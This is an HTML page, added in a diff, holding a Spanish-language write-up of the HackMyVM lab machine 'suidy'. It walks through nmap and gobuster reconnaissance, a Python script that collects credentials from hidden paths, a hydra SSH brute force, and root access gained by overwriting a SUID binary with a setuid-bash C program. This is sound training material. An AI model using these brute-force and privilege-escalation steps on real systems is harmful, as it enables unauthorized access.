@@ -1,0 +1,285 @@
+<!DOCTYPE html>
+<html lang="en">
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=4444&amp;path=livereload" data-no-instant defer></script>
+
+	<meta charset="UTF-8" />
+	<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+
+	<title>suidy - HackMyVM (Easy) |  fafi </title>
+    
+
+	<link rel="icon" type="image/x-icon" href="/images/favicon.ico">
+    <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16.png">
+    <link rel="android-chrome-192x192" type="image/png" sizes="192x192" href="/images/android-chrome-192x192.png">
+    <link rel="android-chrome-512x512" type="image/png" sizes="512x512" href="/images/android-chrome-512x512.png">
+    <link rel="manifest" href="/images/site.webmanifest">
+
+	<link rel="stylesheet" href="/css/style.css" type="text/css" media="all" />
+
+</head>
+
+<body>
+
+<header class="site-header">
+
+<nav>
+  <div>
+    <a href="/" class="title">
+          
+            fafi 
+          
+    </a>
+  </div>
+  
+  
+  <div class="sections">
+            
+            
+            
+            
+            <a  href="/" title="">Home</a>
+            
+            
+            <a  href="/writeups/" title="">Writeups</a>
+            
+            
+            <a  href="/labs/" title="">Labs</a>
+            
+            
+            <a  href="/posts/" title="">Posts</a>
+            
+  </div>
+
+</nav>
+
+</header>
+
+
+
+
+
+<div class="single-content">
+    
+    <h3 class="single-content-title">suidy - HackMyVM (Easy)</h3>
+
+    <h2 id="descubrimiento-de-máquina-objetivo-en-la-red-con-nmap">Descubrimiento de máquina objetivo en la red con nmap</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nmap -sn 10.38.1.0/24
+</span></span></code></pre></div><p><img src="/images/writeups/hackmyvm/suidy/nmaphd.png" alt="nmap host discovery"></p>
+<h3 id="la-ip-de-la-máquina-objetivo-es-1038134">La IP de la máquina objetivo es <strong>10.38.1.34</strong></h3>
+<h2 id="escaneo-de-puertos-en-la-máquina-objetivo-con-nmap">Escaneo de puertos en la máquina objetivo con nmap</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo nmap -p- --open -sS --min-rate <span style="color:#bd93f9">5000</span> -vvv -n -Pn 10.38.1.34 -oN target_scan.nmap
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>───────┬─────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+</span></span><span style="display:flex;"><span>       │ File: target_scan.nmap
+</span></span><span style="display:flex;"><span>───────┼─────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+</span></span><span style="display:flex;"><span>   <span style="color:#bd93f9">1</span>   │ <span style="color:#6272a4"># Nmap 7.94SVN scan initiated Thu Jul 18 10:48:40 2024 as: nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn -oN t</span>
+</span></span><span style="display:flex;"><span>       │ arget_scan.nmap 10.38.1.34
+</span></span><span style="display:flex;"><span>   <span style="color:#bd93f9">2</span>   │ Nmap scan report <span style="color:#ff79c6">for</span> 10.38.1.34
+</span></span><span style="display:flex;"><span>   <span style="color:#bd93f9">3</span>   │ Host is up, received arp-response <span style="color:#ff79c6">(</span>0.00013s latency<span style="color:#ff79c6">)</span>.
+</span></span><span style="display:flex;"><span>   <span style="color:#bd93f9">4</span>   │ Scanned at 2024-07-18 10:48:41 EDT <span style="color:#ff79c6">for</span> 2s
+</span></span><span style="display:flex;"><span>   <span style="color:#bd93f9">5</span>   │ Not shown: <span style="color:#bd93f9">65533</span> closed tcp ports <span style="color:#ff79c6">(</span>reset<span style="color:#ff79c6">)</span>
+</span></span><span style="display:flex;"><span>   <span style="color:#bd93f9">6</span>   │ PORT   STATE SERVICE REASON
+</span></span><span style="display:flex;"><span>   <span style="color:#bd93f9">7</span>   │ 22/tcp open  ssh     syn-ack ttl <span style="color:#bd93f9">64</span>
+</span></span><span style="display:flex;"><span>   <span style="color:#bd93f9">8</span>   │ 80/tcp open  http    syn-ack ttl <span style="color:#bd93f9">64</span>
+</span></span><span style="display:flex;"><span>   <span style="color:#bd93f9">9</span>   │ MAC Address: 08:00:27:88:3D:F4 <span style="color:#ff79c6">(</span>Oracle VirtualBox virtual NIC<span style="color:#ff79c6">)</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#bd93f9">10</span>   │ 
+</span></span><span style="display:flex;"><span>  <span style="color:#bd93f9">11</span>   │ Read data files from: /usr/bin/../share/nmap
+</span></span><span style="display:flex;"><span>  <span style="color:#bd93f9">12</span>   │ <span style="color:#6272a4"># Nmap done at Thu Jul 18 10:48:43 2024 -- 1 IP address (1 host up) scanned in 2.40 seconds</span>
+</span></span><span style="display:flex;"><span>───────┴─────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+</span></span></code></pre></div><h3 id="puertos-abiertos-2280"><strong>Puertos Abiertos: 22,80</strong></h3>
+<h2 id="enumeración-de-directorios-con-gobuster">Enumeración de directorios con gobuster</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>kali :: Documents/hackmyvm/suidy » gobuster dir -u http://10.38.1.34/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,html,zip,txt
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#ff79c6">===============================================================</span>
+</span></span><span style="display:flex;"><span>Gobuster v3.6
+</span></span><span style="display:flex;"><span>by OJ Reeves <span style="color:#ff79c6">(</span>@TheColonial<span style="color:#ff79c6">)</span> &amp; Christian Mehlmauer <span style="color:#ff79c6">(</span>@firefart<span style="color:#ff79c6">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">===============================================================</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">[</span>+<span style="color:#ff79c6">]</span> Url:                     http://10.38.1.34/
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">[</span>+<span style="color:#ff79c6">]</span> Method:                  GET
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">[</span>+<span style="color:#ff79c6">]</span> Threads:                 <span style="color:#bd93f9">10</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">[</span>+<span style="color:#ff79c6">]</span> Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">[</span>+<span style="color:#ff79c6">]</span> Negative Status codes:   <span style="color:#bd93f9">404</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">[</span>+<span style="color:#ff79c6">]</span> User Agent:              gobuster/3.6
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">[</span>+<span style="color:#ff79c6">]</span> Extensions:              php,html,zip,txt
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">[</span>+<span style="color:#ff79c6">]</span> Timeout:                 <span style="color:#8be9fd;font-style:italic">10s</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">===============================================================</span>
+</span></span><span style="display:flex;"><span>Starting gobuster in directory enumeration <span style="color:#8be9fd;font-style:italic">mode</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">===============================================================</span>
+</span></span><span style="display:flex;"><span>/index.html           <span style="color:#ff79c6">(</span>Status: 200<span style="color:#ff79c6">)</span> <span style="color:#ff79c6">[</span>Size: 22<span style="color:#ff79c6">]</span>
+</span></span><span style="display:flex;"><span>/robots.txt           <span style="color:#ff79c6">(</span>Status: 200<span style="color:#ff79c6">)</span> <span style="color:#ff79c6">[</span>Size: 362<span style="color:#ff79c6">]</span>
+</span></span><span style="display:flex;"><span>Progress: <span style="color:#bd93f9">1102795</span> / <span style="color:#bd93f9">1102800</span> <span style="color:#ff79c6">(</span>100.00%<span style="color:#ff79c6">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">===============================================================</span>
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">Finished</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">===============================================================</span>
+</span></span></code></pre></div><h2 id="contenido-del-archivo-robotstxt">Contenido del archivo robots.txt</h2>
+<p><img src="/images/writeups/hackmyvm/suidy/robotstxt.png" alt="nmap host discovery"></p>
+<p><img src="/images/writeups/hackmyvm/suidy/robotstxtend.png" alt="nmap host discovery"></p>
+<p><img src="/images/writeups/hackmyvm/suidy/shehatesme.png" alt="nmap host discovery"></p>
+<h2 id="script-en-python-para-obtener-credenciales-y-eliminar-las-duplicadas">Script en python para obtener credenciales y eliminar las duplicadas</h2>
+<p><em>Rutas encontradas con gobuster y guardadas en el archivo <strong>files.txt</strong></em></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#ff79c6">import</span> requests
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">def</span> <span style="color:#50fa7b">get_files_content</span>():
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">with</span> <span style="color:#8be9fd;font-style:italic">open</span>(<span style="color:#f1fa8c">&#34;files.txt&#34;</span>, <span style="color:#f1fa8c">&#39;r&#39;</span>) <span style="color:#ff79c6">as</span> routes:
+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">for</span> route <span style="color:#ff79c6">in</span> routes:
+</span></span><span style="display:flex;"><span>            url <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">f</span><span style="color:#f1fa8c">&#34;http://10.38.1.34/shehatesme</span><span style="color:#f1fa8c">{</span>route<span style="color:#ff79c6">.</span>strip()<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">&#34;</span>
+</span></span><span style="display:flex;"><span>            response <span style="color:#ff79c6">=</span> requests<span style="color:#ff79c6">.</span>get(url)
+</span></span><span style="display:flex;"><span>            <span style="color:#8be9fd;font-style:italic">print</span>(response<span style="color:#ff79c6">.</span>text)
+</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">with</span> <span style="color:#8be9fd;font-style:italic">open</span>(<span style="color:#f1fa8c">&#34;credentials.txt&#34;</span>, <span style="color:#f1fa8c">&#39;a&#39;</span>) <span style="color:#ff79c6">as</span> creds:
+</span></span><span style="display:flex;"><span>                creds<span style="color:#ff79c6">.</span>write(response<span style="color:#ff79c6">.</span>text)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">def</span> <span style="color:#50fa7b">delete_duplicates_creds</span>():
+</span></span><span style="display:flex;"><span>    creds_seen <span style="color:#ff79c6">=</span> <span style="color:#8be9fd;font-style:italic">set</span>() <span style="color:#6272a4"># holds lines already seen</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">with</span> <span style="color:#8be9fd;font-style:italic">open</span>(<span style="color:#f1fa8c">&#34;credentials.txt&#34;</span>, <span style="color:#f1fa8c">&#39;r&#39;</span>) <span style="color:#ff79c6">as</span> creds:
+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">for</span> cred <span style="color:#ff79c6">in</span> creds:
+</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">with</span> <span style="color:#8be9fd;font-style:italic">open</span>(<span style="color:#f1fa8c">&#34;credentials_clean.txt&#34;</span>, <span style="color:#f1fa8c">&#39;a&#39;</span>) <span style="color:#ff79c6">as</span> creds_clean:
+</span></span><span style="display:flex;"><span>                <span style="color:#ff79c6">if</span> cred <span style="color:#ff79c6">not</span> <span style="color:#ff79c6">in</span> creds_seen: <span style="color:#6272a4"># not a duplicate</span>
+</span></span><span style="display:flex;"><span>                    creds_clean<span style="color:#ff79c6">.</span>write(cred)
+</span></span><span style="display:flex;"><span>                    creds_seen<span style="color:#ff79c6">.</span>add(cred)
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>get_files_content()
+</span></span><span style="display:flex;"><span>delete_duplicates_creds()
+</span></span></code></pre></div><h2 id="credenciales-encontradas">Credenciales encontradas</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>───────┬─────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+</span></span><span style="display:flex;"><span>       │ File: credentials_clean.txt
+</span></span><span style="display:flex;"><span>───────┼─────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+</span></span><span style="display:flex;"><span>   <span style="color:#bd93f9">1</span>   │ yuijhse/hjupnkk
+</span></span><span style="display:flex;"><span>   <span style="color:#bd93f9">2</span>   │ jaime11/JKiufg6
+</span></span><span style="display:flex;"><span>   <span style="color:#bd93f9">3</span>   │ hidden1/passZZ!
+</span></span><span style="display:flex;"><span>   <span style="color:#bd93f9">4</span>   │ jhfbvgt/iugbnvh
+</span></span><span style="display:flex;"><span>   <span style="color:#bd93f9">5</span>   │ john765/FDrhguy
+</span></span><span style="display:flex;"><span>   <span style="color:#bd93f9">6</span>   │ maria11/jhfgyRf
+</span></span><span style="display:flex;"><span>   <span style="color:#bd93f9">7</span>   │ mmnnbbv/iughtyr
+</span></span><span style="display:flex;"><span>   <span style="color:#bd93f9">8</span>   │ smileys/98GHbjh
+</span></span><span style="display:flex;"><span>   <span style="color:#bd93f9">9</span>   │ nhvjguy/kjhgyut
+</span></span><span style="display:flex;"><span>  <span style="color:#bd93f9">10</span>   │ theuser/thepass
+</span></span><span style="display:flex;"><span>───────┴─────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+</span></span></code></pre></div><h2 id="brute-force-ssh-con-hydra">Brute Force ssh con hydra</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>───────┬─────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+</span></span><span style="display:flex;"><span>       │ File: usernames.txt
+</span></span><span style="display:flex;"><span>───────┼─────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+</span></span><span style="display:flex;"><span>   <span style="color:#bd93f9">1</span>   │ yuijhse
+</span></span><span style="display:flex;"><span>   <span style="color:#bd93f9">2</span>   │ jaime11
+</span></span><span style="display:flex;"><span>   <span style="color:#bd93f9">3</span>   │ hidden1
+</span></span><span style="display:flex;"><span>   <span style="color:#bd93f9">4</span>   │ jhfbvgt
+</span></span><span style="display:flex;"><span>   <span style="color:#bd93f9">5</span>   │ john765
+</span></span><span style="display:flex;"><span>   <span style="color:#bd93f9">6</span>   │ maria11
+</span></span><span style="display:flex;"><span>   <span style="color:#bd93f9">7</span>   │ mmnnbbv
+</span></span><span style="display:flex;"><span>   <span style="color:#bd93f9">8</span>   │ smileys
+</span></span><span style="display:flex;"><span>   <span style="color:#bd93f9">9</span>   │ nhvjguy
+</span></span><span style="display:flex;"><span>  <span style="color:#bd93f9">10</span>   │ theuser
+</span></span><span style="display:flex;"><span>───────┴─────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>───────┬─────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+</span></span><span style="display:flex;"><span>       │ File: passwords.txt
+</span></span><span style="display:flex;"><span>───────┼─────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+</span></span><span style="display:flex;"><span>   <span style="color:#bd93f9">1</span>   │ hjupnkk
+</span></span><span style="display:flex;"><span>   <span style="color:#bd93f9">2</span>   │ JKiufg6
+</span></span><span style="display:flex;"><span>   <span style="color:#bd93f9">3</span>   │ passZZ!
+</span></span><span style="display:flex;"><span>   <span style="color:#bd93f9">4</span>   │ iugbnvh
+</span></span><span style="display:flex;"><span>   <span style="color:#bd93f9">5</span>   │ FDrhguy
+</span></span><span style="display:flex;"><span>   <span style="color:#bd93f9">6</span>   │ jhfgyRf
+</span></span><span style="display:flex;"><span>   <span style="color:#bd93f9">7</span>   │ iughtyr
+</span></span><span style="display:flex;"><span>   <span style="color:#bd93f9">8</span>   │ 98GHbjh
+</span></span><span style="display:flex;"><span>   <span style="color:#bd93f9">9</span>   │ kjhgyut
+</span></span><span style="display:flex;"><span>  <span style="color:#bd93f9">10</span>   │ thepass
+</span></span><span style="display:flex;"><span>───────┴─────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>kali :: Documents/hackmyvm/suidy » sudo hydra -L usernames.txt -P passwords.txt ssh://10.38.1.34  
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">[</span>sudo<span style="color:#ff79c6">]</span> password <span style="color:#ff79c6">for</span> fafi: 
+</span></span><span style="display:flex;"><span>Hydra v9.5 <span style="color:#ff79c6">(</span>c<span style="color:#ff79c6">)</span> <span style="color:#bd93f9">2023</span> by van Hauser/THC &amp; David Maciejak - Please <span style="color:#ff79c6">do</span> not use in military or secret service organizations, or <span style="color:#ff79c6">for</span> illegal purposes <span style="color:#ff79c6">(</span>this is non-binding, these *** ignore laws and ethics anyway<span style="color:#ff79c6">)</span>.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Hydra <span style="color:#ff79c6">(</span>https://github.com/vanhauser-thc/thc-hydra<span style="color:#ff79c6">)</span> starting at 2024-07-18 12:00:29
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">[</span>WARNING<span style="color:#ff79c6">]</span> Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t <span style="color:#bd93f9">4</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">[</span>DATA<span style="color:#ff79c6">]</span> max <span style="color:#bd93f9">16</span> tasks per <span style="color:#bd93f9">1</span> server, overall <span style="color:#bd93f9">16</span> tasks, <span style="color:#bd93f9">100</span> login tries <span style="color:#ff79c6">(</span>l:10/p:10<span style="color:#ff79c6">)</span>, ~7 tries per task
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">[</span>DATA<span style="color:#ff79c6">]</span> attacking ssh://10.38.1.34:22/
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">[</span>22<span style="color:#ff79c6">][</span>ssh<span style="color:#ff79c6">]</span> host: 10.38.1.34   login: theuser   password: thepass
+</span></span><span style="display:flex;"><span><span style="color:#bd93f9">1</span> of <span style="color:#bd93f9">1</span> target successfully completed, <span style="color:#bd93f9">1</span> valid password found
+</span></span><span style="display:flex;"><span>Hydra <span style="color:#ff79c6">(</span>https://github.com/vanhauser-thc/thc-hydra<span style="color:#ff79c6">)</span> finished at 2024-07-18 12:00:52
+</span></span></code></pre></div><h3 id="credenciales">Credenciales</h3>
+<p><code>theuser:thepass</code></p>
+<h2 id="flag-de-usuario-theuser">Flag de usuario theuser</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>kali :: Documents/hackmyvm/suidy » ssh theuser@10.38.1.34 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>theuser@10.38.1.34&#39;s password: thepass
+</span></span><span style="display:flex;"><span>Linux suidy 4.19.0-9-amd64 <span style="color:#6272a4">#1 SMP Debian 4.19.118-2+deb10u1 (2020-06-07) x86_64</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>The programs included with the Debian GNU/Linux system are free software;
+</span></span><span style="display:flex;"><span>the exact distribution terms <span style="color:#ff79c6">for</span> each program are described in the
+</span></span><span style="display:flex;"><span>individual files in /usr/share/doc/*/copyright.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+</span></span><span style="display:flex;"><span>permitted by applicable law.
+</span></span><span style="display:flex;"><span>Last login: Sun Sep <span style="color:#bd93f9">27</span> 00:41:28 <span style="color:#bd93f9">2020</span>
+</span></span><span style="display:flex;"><span>theuser@suidy:~$ ls
+</span></span><span style="display:flex;"><span>user.txt
+</span></span><span style="display:flex;"><span>theuser@suidy:~$ cat user.txt 
+</span></span><span style="display:flex;"><span>HMV23*****
+</span></span></code></pre></div><h2 id="binario-encontrado-en-homesuidy">Binario encontrado en /home/suidy</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>theuser@suidy:/home/suidy$ ls
+</span></span><span style="display:flex;"><span>note.txt  suidyyyyy
+</span></span></code></pre></div><p><em>Al ejecutarlo cambia el usuario a suidy y nos permite leer el archivo note.txt</em></p>
+<h2 id="contenido-de-notetxt">Contenido de note.txt</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>suidy@suidy:/home/suidy$ cat note.txt 
+</span></span><span style="display:flex;"><span>I love SUID files!
+</span></span><span style="display:flex;"><span>The best file is suidyyyyy because users can use it to feel as I feel.
+</span></span><span style="display:flex;"><span>root know it and run an script to be sure that my file has SUID. 
+</span></span><span style="display:flex;"><span>If you are <span style="color:#f1fa8c">&#34;theuser&#34;</span> I hate you!
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>-suidy
+</span></span></code></pre></div><h2 id="modificación-del-archivo-suidyyyyy-y-obtención-de-flag-del-usuario-root">Modificación del archivo suidyyyyy y obtención de flag del usuario root</h2>
+<h3 id="código-en-c-para-ejecutar-una-bash-como-root">Código en C para ejecutar una bash como root</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ff79c6">#include</span> <span style="color:#ff79c6">&lt;stdio.h&gt;</span><span style="color:#ff79c6">
+</span></span></span><span style="display:flex;"><span><span style="color:#ff79c6"></span>
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd">int</span> <span style="color:#50fa7b">main</span>() {
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>   <span style="color:#6272a4">//use the system fucntion to execute the command.
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>   <span style="color:#50fa7b">setuid</span>(<span style="color:#bd93f9">0</span>);
+</span></span><span style="display:flex;"><span>   <span style="color:#50fa7b">system</span>(<span style="color:#f1fa8c">&#34;/bin/bash -p&#34;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>   <span style="color:#ff79c6">return</span> <span style="color:#bd93f9">0</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>theuser@suidy:~$ gcc exec.c -o <span style="color:#8be9fd;font-style:italic">exec</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>theuser@suidy:/home/suidy$ cp ../theuser/exec suidyyyyy
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>theuser@suidy:/home/suidy$ ls
+</span></span><span style="display:flex;"><span>note.txt  pspy64  suidyyyyy
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>theuser@suidy:/home/suidy$ ./suidyyyyy
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span> 
+</span></span><span style="display:flex;"><span>root@suidy:/home/suidy# whoami
+</span></span><span style="display:flex;"><span>root
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>root@suidy:/# <span style="color:#8be9fd;font-style:italic">cd</span> root/
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>root@suidy:/root# ls
+</span></span><span style="display:flex;"><span>root.txt  timer.sh
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>root@suidy:/root# cat root.txt 
+</span></span><span style="display:flex;"><span>HMV00*****
+</span></span></code></pre></div>
+</div>
+
+
+<footer>
+<a class="footer-github" href='https://github.com/jfbfafi' target='_blank' rel='noreferrer'>
+	<svg xmlns="http://www.w3.org/2000/svg" width="1em" height="1em" viewBox="0 0 24 24"><path fill="#50fa7b" d="M12 2A10 10 0 0 0 2 12c0 4.42 2.87 8.17 6.84 9.5c.5.08.66-.23.66-.5v-1.69c-2.77.6-3.36-1.34-3.36-1.34c-.46-1.16-1.11-1.47-1.11-1.47c-.91-.62.07-.6.07-.6c1 .07 1.53 1.03 1.53 1.03c.87 1.52 2.34 1.07 2.91.83c.09-.65.35-1.09.63-1.34c-2.22-.25-4.55-1.11-4.55-4.92c0-1.11.38-2 1.03-2.71c-.1-.25-.45-1.29.1-2.64c0 0 .84-.27 2.75 1.02c.79-.22 1.65-.33 2.5-.33s1.71.11 2.5.33c1.91-1.29 2.75-1.02 2.75-1.02c.55 1.35.2 2.39.1 2.64c.65.71 1.03 1.6 1.03 2.71c0 3.82-2.34 4.66-4.57 4.91c.36.31.69.92.69 1.85V21c0 .27.16.59.67.5C19.14 20.16 22 16.42 22 12A10 10 0 0 0 12 2"/>
+	</svg>
+</a>
+
+<a class="footer-linkedin" href='https://www.linkedin.com/in/juan-fafi-burgos/' target='_blank' rel='noreferrer'>
+
+	<svg xmlns="http://www.w3.org/2000/svg" width="1em" height="1em" viewBox="0 0 24 24">
+		<path fill="#50fa7b" d="M19 3a2 2 0 0 1 2 2v14a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2zm-.5 15.5v-5.3a3.26 3.26 0 0 0-3.26-3.26c-.85 0-1.84.52-2.32 1.3v-1.11h-2.79v8.37h2.79v-4.93c0-.77.62-1.4 1.39-1.4a1.4 1.4 0 0 1 1.4 1.4v4.93zM6.88 8.56a1.68 1.68 0 0 0 1.68-1.68c0-.93-.75-1.69-1.68-1.69a1.69 1.69 0 0 0-1.69 1.69c0 .93.76 1.68 1.69 1.68m1.39 9.94v-8.37H5.5v8.37z" />
+	</svg>
+</a>
+
+
+</footer>
+
